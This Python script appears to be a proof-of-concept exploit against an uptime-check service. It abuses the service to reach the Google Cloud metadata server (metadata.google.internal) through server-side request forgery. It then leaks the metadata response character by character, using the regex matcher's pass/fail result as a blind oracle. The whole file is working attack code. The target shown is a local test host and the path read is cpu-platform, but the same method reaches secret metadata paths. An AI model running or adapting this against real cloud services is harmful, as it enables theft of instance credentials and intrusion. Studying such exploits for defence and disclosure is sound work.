import requests
import string

def send_request(content):
    url = "http://localtest.me:8000/uptime_check"
    data= { 
        "contentMatchers": 
        [
            {
                "content": content, 
                "matcher": "MATCHES_REGEX"
            }
        ], 
        "httpCheck": {
            "headers": {"Metadata-Flavor": "Google"}, 
            "path": "/computeMetadata/v1/instance/cpu-platform", 
            "port": 80, 
            "requestMethod": "GET", 
            "useSsl": False
        }, 
        "monitoredResource": {"host": "metadata.google.internal"}}
    resp = requests.post(url, json=data)
    result = resp.json()['uptimeCheckResults'][0]['checkPassed']
    return result


def get_next_character(known):
    for char in charset:
        content = f'{known}{char}'
        result = send_request(content)
        if result:
            return content



if __name__ == '__main__':
    charset = string.ascii_lowercase + string.ascii_uppercase + ' '
    known = '^'
    while True:
        known = get_next_character(known)
        print(known)
